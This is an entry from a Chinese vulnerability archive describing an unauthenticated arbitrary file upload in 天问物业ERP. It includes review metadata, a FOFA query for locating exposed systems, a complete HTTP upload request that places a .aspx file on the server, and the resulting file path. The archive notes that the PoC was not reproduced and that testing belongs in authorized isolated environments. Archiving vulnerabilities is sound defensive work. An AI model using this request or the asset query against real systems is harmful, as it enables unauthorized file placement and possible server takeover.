---
source: "wy876 漏洞文库"
title: "天问物业ERP IntroductionManage UploadFile上传"
product: "天问物业ERP"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本"
prerequisites: "声称前台"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/aulalbh07a6ga4py"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E5%A4%A9%E9%97%AE%E7%89%A9%E4%B8%9AERP/%E5%A4%A9%E9%97%AE%E7%89%A9%E4%B8%9AERP%E7%B3%BB%E7%BB%9FUploadFile.aspx%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"国家版权局软著登字第1205328号\""
id: "vw-494c24d43e4a511dafe1441b"
entity_id: "ve-494c24d43e4a511dafe1441b"
schema_version: "1"
previous_fofa_unverified: "body="
---

# 天问物业ERP IntroductionManage UploadFile上传

> 指纹字段校订（2026-10-04）：本文原归档明确标为 FOFA 的完整表达式已记入 `fofa`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

## 条目说明

- 对象与具体问题：天问物业ERP；IntroductionManage UploadFile上传
- 版本、配置及部署条件：无版本
- 认证与权限前提：声称前台
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 纯文本123写aspx只证写入可访问不证服务器代码执行
- FOFA截断，无响应/版本/修复

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
成都天问互联科技有限公司以软件开发和技术服务为基础，建立物业ERP应用系统，向物管公司提供旨在降低成本、保障品质、提升效能为目标的智慧物管整体解决方案。天问物业ERP系统UploadFile.aspx存在文件上传漏洞，攻击者可以利用漏洞上传恶意文件获取服务器权限。

## 二、影响版本
+ 天问物业ERP

## 三、资产测绘
+ fofa`body="国家版权局软著登字第1205328号"`
+ 登录页面


## 四、漏洞复现
```http
POST /HM/M_Main/IntroductionManage/UploadFile.aspx HTTP/1.1
Content-Type: multipart/form-data; boundary=00content0boundary00
User-Agent: Java/1.8.0_301
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 121
Connection: close

--00content0boundary00
Content-Disposition: form-data; name="file"; filename="1.aspx"

123
--00content0boundary00--

```

> 请求长度说明：原资料 Content-Length 为 121；保留原始标头；其数值未据实际请求体重新计算或验证。


上传文件地址

```plain
http://xx.xx.xx.xx/HM/M_Main/UploadFiles/IntroductionManage/20230929223355771.aspx
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/aulalbh07a6ga4py>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
